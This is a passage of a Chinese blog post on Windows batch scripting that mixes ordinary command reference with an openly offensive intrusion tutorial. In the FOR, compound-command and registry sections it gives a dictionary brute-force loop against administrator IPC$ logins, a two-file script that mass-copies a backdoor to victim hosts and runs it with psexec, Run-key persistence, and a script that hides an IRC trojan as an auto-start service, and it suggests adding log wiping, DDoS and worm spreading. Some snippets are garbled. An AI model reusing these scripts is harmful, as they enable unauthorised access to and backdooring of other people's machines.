IP 级连接。回响<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/应答消息">应答消息</a>的接收情况将和<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/往返过程">往返过程</a>的次数一起显示出来。Ping 是用于检测网络连接性、可到达性和名称解析的疑难问题的主要 TCP/IP 命令。如果不带参数，ping 将显示帮助。</p><h3 id="AT命令"><a href="#AT命令" class="headerlink" title="AT命令"></a>AT命令</h3><p>AT 命令安排在特定日期和时间运行命令和程序。</p><p>要使用 AT 命令，计划服务必须已在运行中。</p><p>AT [\computername] [ [id] [/DELETE] | /DELETE [/YES]]</p><p>AT [\computername] time [/INTERACTⅣE] [ /EVERY:date[,…] | /NEXT:date[,…]] “command”</p><p>\computername 指定远程计算机。如果省略这个参数，会计划在本地计算机上运行命令。</p><p>id 指定给已计划命令的识别号。</p><p>/delete 删除某个已计划的命令。如果省略 id，计算机上所有已计划的命令都会被删除。</p><p>/yes 不需要进一步确认时，跟删除所有作业的命令一起使用。</p><p>time 指定运行命令的时间。</p><p>/interactive 允许作业在运行时，与当时登录的用户桌面进行交互。</p><p>/every:date[,…] 指定在每周或每月的特定日期运行命令。如果省略日期，则默认为在的运行。</p><p>/next:date[,…] 指定在下一个指定日期（如，下周四）运行命令。如果省略日期，则默认为在的运行。</p><p>“command” 准备运行的 Windows NT 命令或<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/批处理程序">批处理程序</a>。</p><h3 id="del命令"><a href="#del命令" class="headerlink" title="del命令"></a>del命令</h3><p>del命令用于删除一个或多个文件。其命令格式为“del [/P] [/F] [/S] [/Q][/A[[:]attributes]]names”。其中P用于删除每一个文件之前提示确认；F用于强制删除只读文件；S用于从所有子目录删除指定文件；Q为安静模式，删除全局通配符时，不要求确认；A用于根据属性选择要删除的文件；attributes用于对应A所要删除文件的属性，包括的参数值中R代表只读文件，S代表系统文件，H代表隐藏文件，A代表存档文件，-表示“否”的前缀：names用于指定一个文件名或者一个目录，指定目录时，其中所包含的所有文件都会被删除 [1] 。</p><h3 id="net命令"><a href="#net命令" class="headerlink" title="net命令"></a>net命令</h3><p>这里只介绍开启网络服务和关闭网络服务的命令格式。</p><p>“net start[service]”用于开启网络服务，servlce用于指定需要开启的网络服务名，若不指定则开启所有能够开启的网络服务 [1] 。</p><p>“net stop service”用于关闭网络服务，其中servlce是需要关闭的网络服务名，此项必须指定 [1] 。</p><h2 id="选项语法"><a href="#选项语法" class="headerlink" title="选项语法"></a>选项语法</h2><p><a href="javascript:;">编辑</a></p><p>%~I - 删除任何引号（”)，扩充 %I</p><p>%~fI - 将 %I 扩充到一个完全合格的路径名</p><p>%~dI - 仅将 %I 扩充到一个驱动器号</p><p>%~pI - 仅将 %I 扩充到一个路径</p><p>%~nI - 仅将 %I 扩充到一个文件名</p><p>%~xI - 仅将 %I 扩充到一个<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/文件扩展名">文件扩展名</a></p><p>%~sI - 扩充的路径只含有短名</p><p>%~aI - 将 %I 扩充到文件的<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/文件属性">文件属性</a></p><p>%~tI - 将 %I 扩充到文件的日期/时间</p><p>%~zI - 将 %I 扩充到文件的大小</p><p>%~$PATH:I - 查找列在路径<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/环境变量">环境变量</a>的目录，并将 %I 扩充</p><p>到找到的第一个完全合格的名称。如果环境变量</p><p>未被定义，或者没有找到文件，此组合键会扩充</p><p><a target="_blank" rel="noopener" href="https://baike.baidu.com/item/空字符串">空字符串</a></p><p>可以组合修饰符来得到多重结果：</p><p>%~dpI - 仅将 %I 扩充到一个驱动器号和路径</p><p>%~nxI - 仅将 %I 扩充到一个文件名和扩展名</p><p>%~fsI - 仅将 %I 扩充到一个带有短名的完整路径名</p><p>%~dp$PATH:i - 查找列在路径环境变量的目录，并将 %I 扩充</p><p>到找到的第一个驱动器号和路径。</p><p>%~ftzaI - 将 %I 扩充到类似输出线路的 DIR</p><p>在以上例子中，%I 和 PATH 可用其他有效数值代替。%~ 语法</p><p>用一个有效的 FOR变量名终止。选取类似 %I 的大写变量名</p><p>比较易读，而且避免与不分大小写的组合键混淆。</p><p>以上是MS的官方帮助，下面我们举几个例子来具体说明一下For命令在入侵中的用途。</p><p>sample2：</p><p>利用For命令来实现对一台目标Win2k<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/主机">主机</a>的暴力密码破解。</p><p>我们用net use \ip\ipc$ “password” /u:”administrator”来尝试这和目标主机进行连接，当成功时记下密码。</p><p>最主要的命令是一条：for /f %i in (dict.txt) do net use \ip\ipc$ “%i” /u:”administrator”</p><p>用i%来表示admin的密码，在dict.txt中这个取i%的值用net use 命令来连接。然后将程序运行结果传递给find命令－－</p><p>for /f i%% in (dict.txt) do net use \ip\ipc$ “%%i” /u:”administrator”|find “:命令成功完成”&gt;&gt;D:\ok.txt ，这样就ko了。</p><p>sample3：</p><p>你有没有过手里有大量肉鸡等着你去种后门+木马呢？，当数量特别多的时候，原本很开心的一件事都会变得很郁闷：）。文章开头就谈到使用<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/批处理文件">批处理文件</a>，可以简化日常或重复性任务。那么如何实现呢？呵呵，看下去你就会明白了。</p><p>主要命令也只有一条：（在批处理文件中使用 FOR 命令时，指定变量使用 %%variable）</p><p>@for /f “tokens=1,2,3 delims= “ %%i in (victim.txt) do start call door.bat %%i %%j %%k</p><p>tokens的用法请参见上面的sample1，在这里它表示按顺序将victim.txt中的内容传递给door.bat中的参数%i %j %k。</p><p>而cultivate.bat无非就是用net use命令来建立IPC$连接，并copy木马+后门到victim，然后用返回码（If errorlever =）来筛选成功种植后门的主机，并echo出来，或者echo到指定的文件。</p><p>delims= 表示vivtim.txt中的内容是一空格来分隔的。我想看到这里你也一定明白这victim.txt里的内容是什么样的了。应该根据%%i %%j %%k表示的对象来排列，一般就是 ip password username。</p><h2 id="代码雏形"><a href="#代码雏形" class="headerlink" title="代码雏形"></a>代码雏形</h2><p><a href="javascript:;">编辑</a></p><p>cut here then save as a batchfile(I call it main.bat) -@echo off</p><p>@if “%1”==”” goto usage</p><p>@for /f “tokens=1,2,3 delims= “ %%i in (victim.txt) do start call IPChack.bat %%i %%j %%k</p><p>@goto end</p><p>：usage</p><p>@echo run this batch in dos modle.or just double-click it.</p><p>：end</p><p>cut here then save as a batchfile(I call it main.bat)cut here then save as a batchfile(I call it door.bat)</p><p>@net use \%1\ipc$ %3 /u:”%2”</p><p>@if errorlevel 1 goto failed</p><p>@echo Trying to establish the IPC$ connection OK</p><p>@copy windrv32.exe\%1\admin$\system32 &amp;&amp; if not errorlevel 1 echo IP %1 USER %2 PWD %3 &gt;&gt;ko.txt</p><p>@<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/psexec">psexec</a>\%1 c:\winnt\system32\windrv32.exe%1 Backdoored &gt;&gt;ko.txt</p><p>：failed</p><p>@echo Sorry can not connected to the victim.</p><p>cut here then save as a batchfile(I call it door.bat)</p><p>这只是一个自动种植后门<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/批处理">批处理</a>的雏形，两个批处理和后门程序（Windrv32.exe），PSexec.exe需放在统一目录下.批处理内容</p><p>尚可扩展，例如：加入清除日志+DDOS的功能，加入定时添加用户的功能，更深入一点可以使之具备自动传播功能（<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/蠕虫">蠕虫</a>).此处不多做叙述，有兴趣的朋友可自行研究.</p><h2 id="使用参数"><a href="#使用参数" class="headerlink" title="使用参数"></a>使用参数</h2><p><a href="javascript:;">编辑</a></p><p><a target="_blank" rel="noopener" href="https://baike.baidu.com/item/批处理">批处理</a>中可以使用参数，一般从%1到%9这九个，当有多个参数时需要用shift来移动，这种情况并不多见，我们就不考虑它了。</p><p>sample1：fomat.bat</p><p>@echo off</p><p>if “%1”==”a” format a:</p><p>:format</p><p>@format a:/q/u/auotset</p><p>@echo please insert another disk to driver A.</p><p>@pause</p><p>@goto fomat</p><p>这个例子用于连续地格式化几张<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/软盘">软盘</a>，所以用的时候需在dos窗口输入fomat.bat a，呵呵，好像有点画蛇添足了～^_^</p><p>sample2：</p><p>当我们要建立一个IPC$连接地时候总要输入一大串命令，弄不好就打错了，所以我们不如把一些固定命令写入一个<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/批处理">批处理</a>，把<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/肉鸡">肉鸡</a>地ip password username 当着参数来赋给这个批处理，这样就不用每次都打命令了。</p><p>@echo off</p><p>@net use \1%\ipc$ “%2” /u:”%3” 注意哦，这里PASSWORD是第二个参数。</p><p>@if errorlevel 1 echo connection failed</p><p>怎么样，使用参数还是比较简单的吧？你这么帅一定学会了^_^.No.3</p><p>三.如何使用组合命令（Compound Command)</p><p>⒈&amp;</p><p>Usage：第一条命令 &amp; 第二条命令 [&amp; 第三条命令…]</p><p>用这种方法可以同时执行多条命令，而不管命令是否执行成功</p><p>Sample：</p><p>C:&gt;dir z: &amp; dir c:\Ex4rch</p><p>The system cannot find the path specified.</p><p>Volume in drive C has no label.</p><p>Volume Serial Number is 0078-59FB</p><p>Directory of c:\Ex4rch</p><p>2002-05-14 23:51<dir>.</dir></p><p>2002-05-14 23:51<dir>..</dir></p><p>2002-05-14 23:51 14 sometips.gif</p><p>⒉&amp;&amp;</p><p>Usage：第一条命令 &amp;&amp; 第二条命令 [&amp;&amp; 第三条命令…]</p><p>用这种方法可以同时执行多条命令，当碰到执行出错的命令后将不执行后面的命令，如果一直没有出错则一直执行完所有命令；</p><p>Sample：</p><p>C:&gt;dir z: &amp;&amp; dir c:\Ex4rch</p><p>The system cannot find the path specified.</p><p>C:&gt;dir c:\Ex4rch &amp;&amp; dir z:</p><p>Volume in drive C has no label.</p><p>Volume Serial Number is 0078-59FB</p><p>Directory of c:\Ex4rch</p><p>2002-05-14 23:55<dir>.</dir></p><p>2002-05-14 23:55<dir>..</dir></p><p>2002-05-14 23:55 14 sometips.gif</p><p>1 File(s) 14 bytes</p><p>2 Dir(s) 768,671,744 bytes free</p><p>The system cannot find the path specified.</p><p>在做备份的时候可能会用到这种命令会比较简单，如：</p><p>dir file://192.168.0.1/database/backup.mdb &amp;&amp; copy file://192.168.0.1/database/backup.mdb E:\backup</p><p>如果远程服务器上存在backup.mdb文件，就执行copy命令，若不存在该文件则不执行copy命令。这种用法可以替换IF exist了 ：）</p><p>⒊||</p><p>Usage：第一条命令 || 第二条命令 [|| 第三条命令…]</p><p>用这种方法可以同时执行多条命令，当碰到执行正确的命令后将不执行后面的命令，如果没有出现正确的命令则一直执行完所有命令；</p><p>Sample：</p><p>C:\Ex4rch&gt;dir sometips.gif || del sometips.gif</p><p>Volume in drive C has no label.</p><p>Volume Serial Number is 0078-59FB</p><p>Directory of C:\Ex4rch</p><p>2002-05-14 23:55 14 sometips.gif</p><p>1 File(s) 14 bytes</p><p>0 Dir(s) 768,696,320 bytes free</p><p>组合命令使用的例子：</p><p>sample：</p><p>@copy trojan.exe \%1\admin$\system32 &amp;&amp; if not errorlevel 1 echo IP %1 USER %2 PASS %3 &gt;&gt;victim.txt</p><h2 id="管道命令"><a href="#管道命令" class="headerlink" title="管道命令"></a>管道命令</h2><p><a href="javascript:;">编辑</a></p><p><strong>| 命令</strong></p><p>Usage：第一条命令 | 第二条命令 [| 第三条命令…]</p><p>将第一条命令的结果作为第二条命令的参数来使用，记得在unix中这种方式很常见。</p><p>sample：</p><p>time /t&gt;&gt;D:\IP.log</p><p>netstat -n -p tcp|find “:3389”&gt;&gt;D:\IP.log</p><p>start Explorer</p><p>看出来了么？用于<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/终端服务">终端服务</a>允许我们为用户自定义起始的程序，来实现让用户运行下面这个bat，以获得登录用户的IP。</p><p>将一条命令或某个程序输出结果的重定向到特定文件中，&gt; 与 &gt;&gt;；的区别在于，&gt;；会清除调原有文件中的内容后写入指定文件，而&gt;&gt;；只会追加内容到指定文件中，而不会改动其中的内容。</p><p>sample1：</p><p>echo hello world&gt;c:\hello.txt (stupid example?)</p><p>sample2:</p><p>时下<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/DLL木马">DLL木马</a>盛行，我们知道system32是个捉迷藏的好地方，许多木马都削尖了脑袋往那里钻，DLL马也不例外，针对这一点我们可以在安装好系统和必要的应用程序后，对该目录下的EXE和DLL文件作一个记录：</p><p>运行CMD–转换目录到system32–dir *.exe&gt;exeback.txt &amp; dir *.dll&gt;dllback.txt,</p><p>这样所有的EXE和DLL文件的名称都被分别记录到exeback.txt和dllback.txt中，</p><p>日后如发现异常但用传统的方法查不出问题时，则要考虑是不是系统中已经潜入DLL木马了.</p><p>这时我们用同样的命令将system32下的EXE和DLL文件记录到另外的exeback1.txt和dllback1.txt中，然后运行：</p><p>CMD–fc exeback.txt exeback1.txt&gt;diff.txt &amp; fc dllback.txt dllback1.txt&gt;diff.txt.（用FC命令比较前后两次的DLL和EXE文件，并将结果输入到diff.txt中），这样我们就能发现一些多出来的DLL和EXE文件，然后通过查看创建时间、版本、是否经过压缩等就能够比较容易地判断出是不是已经被DLL木马光顾了。没有是最好，如果有的话也不要直接DEL掉，先用regsvr32 /u trojan.dll将后门DLL文件注销掉，再把它移到<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/回收站">回收站</a>里，若系统没有异常反映再将之彻底删除或者提交给杀毒软件公司。</p><p><strong>&lt; 、&gt;&amp; 、&lt;&amp;</strong></p><p>&lt; 从文件中而不是从键盘中读入命令输入。</p><p>&gt;&amp; 将一个句柄的输出写入到另一个句柄的输入中。</p><p>&lt;&amp; 从一个句柄读取输入并将其写入到另一个句柄输出中。</p><p>这些并不常用，也就不多做介绍。</p><p>No.5</p><h2 id="注册表"><a href="#注册表" class="headerlink" title="注册表"></a>注册表</h2><p><a href="javascript:;">编辑</a></p><p>在入侵过程中经常会操作注册表的特定的键值来实现一定的目的，例如：为了达到隐藏后门、<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/木马程序">木马程序</a>而删除Run下残余的键值。或者创建一个服务用以加载后门。当然我们也会修改注册表来加固系统或者改变系统的某个属性，这些都需要我们对注册表操作有一定的了解。下面我们就先学习一下如何使用.REG文件来操作注册表.（我们可以用<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/批处理">批处理</a>来生成一个REG文件）</p><p>关于注册表的操作，常见的是创建、修改、删除。</p><h3 id="创建"><a href="#创建" class="headerlink" title="创建"></a>创建</h3><p>创建分为两种，一种是创建子项（Subkey)</p><p>我们创建一个文件，内容如下：</p><p>Windows Registry Editor Version 5.00</p><p>[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\hacker]</p><p>然后执行该脚本，你就已经在HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft下创建了一个名字为“hacker”的子项。</p><p>另一种是创建一个项目名称</p><p>那这种文件格式就是典型的文件格式，和你从注册表中导出的文件格式一致，内容如下：</p><p>Windows Registry Editor Version 5.00</p><p>“Invader”=”Ex4rch”</p><p>“Door”=C:\WINNT\system32\door.exe</p><p>“Autodos”=dword:02</p><p>这样就在[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run]下</p><p>新建了：Invader、door、about这三个项目</p><p>Invader的类型是“String value”</p><p>door的类型是“REG SZ value”</p><p>Autodos的类型是“DWORD value”</p><h3 id="修改"><a href="#修改" class="headerlink" title="修改"></a>修改</h3><p>修改相对来说比较简单，只要把你需要修改的项目导出，然后用记事本进行修改，然后导入（regedit /s）即可。</p><h3 id="删除"><a href="#删除" class="headerlink" title="删除"></a>删除</h3><p>我们首先来说说删除一个项目名称，我们创建一个如下的文件：</p><p>Windows Registry Editor Version 5.00[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run]</p><p>“Ex4rch”=-</p><p>执行该脚本，[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run]下的”Ex4rch”就被删除了；</p><p>我们再看看删除一个子项，我们创建一个如下的脚本：</p><p>Windows Registry Editor Version 5.00</p><p>[-HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run]</p><p>执行该脚本，[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run]就已经被删除了。</p><p>相信看到这里，.reg文件你基本已经掌握了。那么的目标就是用<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/批处理">批处理</a>来创建特定内容的.reg文件了，记得们前面说道的利用重定向符号可以很容易地创建特定类型的文件。</p><p>samlpe1：如上面的那个例子，如想生成如下<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/注册表文件">注册表文件</a></p><p>Windows Registry Editor Version 5.00</p><p>“door”=hex:255</p><p>“Autodos”=dword:000000128</p><p>只需要这样：</p><p>@echo Windows Registry Editor Version 5.00&gt;&gt;Sample.reg</p><p>@echo</p><p>@echo “Invader”=”Ex4rch”&gt;&gt;Sample.reg</p><p>@echo “door”=5&gt;&gt;C:\WINNT\system32\door.exe&gt;&gt;Sample. reg</p><p>@echo “Autodos”=dword:02&gt;&gt;Sample.reg</p><p>samlpe2:</p><p>使用一些比较老的木马时，可能会在注册表的[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\ CurrentVersion\Run(Runonce、Runservices、Runexec)]下生成一个键值用来实现木马的自启动.但是这样很容易暴露<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/木马程序">木马程序</a>的路径，从而导致木马被查杀，相对地若是将木马程序注册为<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/系统服务">系统服务</a>则相对安全一些.下面以配置好地IRC木马DSNX为例（名为 windrv32.exe)</p><p>@start windrv32.exe</p><p>@attrib +h +r windrv32.exe</p><p>@echo “windsnx “=- &gt;&gt;patch.dll</p><p>@<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/sc.exe">sc.exe</a> create Windriversrv type= kernel start= auto displayname= WindowsDriver binpath= c:\winnt\system32\windrv32.exe</p><p>@regedit /s patch.dll</p><p>@delete patch.dll</p><p>@REM [删除DSNXDE在注册表中的启动项，用<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/sc.exe">sc.exe</a>将之注册为系统关键性服务的同时将其属性设为隐藏和只读，并config为自启动]</p><p>@REM 这样不是更安全^_^.</p><h3 id="实例说明"><a href="#实例说明" class="headerlink" title="实例说明"></a>实例说明</h3><ol><li><p>桌面新建文本文档，更改后缀为bat，不区分大小写。</p></li><li><p>复制如下代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">@echo off</span><br><span class="line"></span><br><span class="line">reg add &quot;HKEY_CLASSES_ROOT\.bat\ShellNew&quot; &#x2F;v nullfile &#x2F;t reg_sz &#x2F;d &quot;&quot; &#x2F;f</span><br><span class="line"></span><br><span class="line">reg add &quot;HKEY_CLASSES_ROOT\.bat\ShellNew&quot; &#x2F;v FileName &#x2F;t reg_expand_sz &#x2F;d &quot;&quot; &#x2F;f</span><br><span class="line"></span><br><span class="line">pause&gt;Nul</span><br></pre></td></tr></table></figure></li><li><p>右键点击新建的bat文档，再左键点击”编辑“，将复制的内容粘贴到文档里面，Ctrl+s保存文档，关闭文档双击运行即可。<img src="https://cdn.jsdelivr.net/gh/kali65536/PicGo@latest/2020/07/07/a4f10a24d98986898e44515668a05cc0.png" data-lazy-src="https://7bu.top/2020/08/11/d9006d58339f3.png" alt="image-20200811210711717"></p></li><li><p>右键新建就可以看到了。<img src="https://cdn.jsdelivr.net/gh/kali65536/PicGo@latest/2020/07/07/a4f10a24d98986898e44515668a05cc0.png" data-lazy-src="https://7bu.top/2020/08/11/a1e53394ef504.png" alt="image-20200811210555409"></p></li></ol></div><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">kali</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://kali.js.org/2020/08/11/bat%E6%96%87%E4%BB%B6/">https://kali.js.org/2020/08/11/bat%E6%96%87%E4%BB%B6/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://kali.js.org" target="_blank">༺小张博客༻</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/bat/">-bat</a></div><div class="post_share"><div class="social-share" data-image="https://api.cder.me" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2020/08/18/wget/"><img class="prev-cover" data-lazy-src="https://cdn.jsdelivr.net/gh/Colsrch/pixiv@master/16.jpg" onerror='onerror=null,src="https://api.yunist.cn"'><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">wget 与 curl 命令详解</div></div></a></div><div class="next-post pull-right"><a href="/2020/08/10/Node-js/"><img class="next-cover" data-lazy-src="https://nodejs.org/static/images/logo.svg" onerror='onerror=null,src="https://api.yunist.cn"'><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">Node.js</div></div></a></div></nav></article></main><footer id="footer" data-type="color"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2021 By kali</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div class="footer_custom_text">CDN BY jsDelivr | HOST BY GitHub && Gitee && Coding</div></div></footer></div><section id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="font_plus" type="button" title="放大字体"><i class="fas fa-plus"></i></button><button id="font_minus" type="button" title="缩小字体"><i class="fas fa-minus"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></section><div class="search-dialog" id="local-search"><div class="search-dialog__title" id="local-search-title">本地搜索</div><div id="local-input-panel"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"></div></div></div><hr><div id="local-search-results"><div id="local-hits"></div><div id="local-stats"><div class="local-search-stats__hr" id="hr"><span>由</span> <a target="_blank" rel="noopener" href="https://github.com/wzpan/hexo-generator-search" style="color:#49b1f5">hexo-generator-search</a> <span>提供支持</span></div></div></div><span class="search-close-button"><i class="fas fa-times"></i></span></div><div id="search-mask"></div><div><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page/instantpage.min.js" type="module" defer></script><script src="https://cdn.jsdelivr.net/npm/vanilla-lazyload/dist/lazyload.iife.min.js" async></script><script src="/js/search/local-search.js"></script><div class="js-pjax"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div><div class="aplayer no-destroy" data-id="7485620337" data-server="tencent" data-type="playlist" data-fixed="true" data-mini="true" data-listfolded="true" data-order="random" data-preload="none" data-autoplay="false" muted></div><script src="https://cdn.jsdelivr.net/gh/xiabo2/CDN@latest/fishes.js"></script><script type="text/javascript">window.$crisp=[],window.CRISP_WEBSITE_ID="eccddc94-91ab-4825-910a-eb2358be6dcf",d=document,s=d.createElement("script"),s.src="https://client.crisp.chat/l.js",s.async=1,d.getElementsByTagName("head")[0].appendChild(s)</script><script src="https://cdn.jsdelivr.net/gh/kali65536/kali65536.github.io/butterflyChange/js/kali.js"></script><div><img src="https://7bu.top/2020/08/15/053d4efbd4e7b.png"; style="position:fixed; opacity:0.5; width:100px; height:100px; left:10px; top:10px;></div><canvas class="fireworks"></canvas><script src="https://cdn.jsdelivr.net/npm/animejs@latest/anime.min.js"></script><script src="/js/third-party/fireworks.js"></script><script defer id="ribbon_piao" mobile="true" src="/js/third-party/piao.js"></script><script src="/js/third-party/activate-power-mode.js"></script><script>POWERMODE.colorful=!0,POWERMODE.shake=!0,document.body.addEventListener("input",POWERMODE)</script><script src="/js/third-party/ClickShowText.js" async></script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css"><script src="https://cdn.jsdelivr.net/gh/kali65536/kali65536.github.io/butterflyChange/js/APlayer.min.js"></script><script src="https://cdn.jsdelivr.net/gh/kali65536/kali65536.github.io/butterflyChange/js/Meting.min.js"></script><script src="https://cdn.jsdelivr.net/npm/pjax/pjax.min.js"></script><script>var pjax = new Pjax({
  elements: 'a:not([target="_blank"])',
  selectors: [
    'title',
    'meta[name=description]',
    '#config_change',
    '#body-wrap',
    '#rightside-config-hide',
    '#rightside-config-show',
    '.js-pjax'
  ],
  cacheBust: false,
})

document.addEventListener('pjax:complete', function () {
  refreshFn()

  $('script[data-pjax]').each(function () {
    $(this).parent().append($(this).remove())
  })

  GLOBAL_CONFIG.islazyload && lazyLoadInstance.update()

  typeof chatBtnFn === 'function' && chatBtnFn()
  typeof panguInit === 'function' && panguInit()

  if (typeof gtag === 'function') {
    gtag('config', '', {'page_path': window.location.pathname});
  }

  typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()

})

document.addEventListener('pjax:send', function () {
  if (window.aplayers) {
    for (let i = 0; i < window.aplayers.length; i++) {
      if (!window.aplayers[i].options.fixed) {
        window.aplayers[i].destroy()
      }
    }
  }

  typeof typed === 'object' && typed.destroy()

  $(window).off('scroll')

  //reset readmode
  $('body').hasClass('read-mode') && $('body').removeClass('read-mode')

  //reset font-size
  $('body').css('font-size') !== originFontSize && $('body').css('font-size', parseFloat(originFontSize))
})</script></div><script async>window.onload=function(){var a=document.createElement('script'),b=document.getElementsByTagName('script')[0];a.type='text/javascript',a.async=!0,a.src='/sw-register.js?v='+Date.now(),b.parentNode.insertBefore(a,b)};</script></body></html>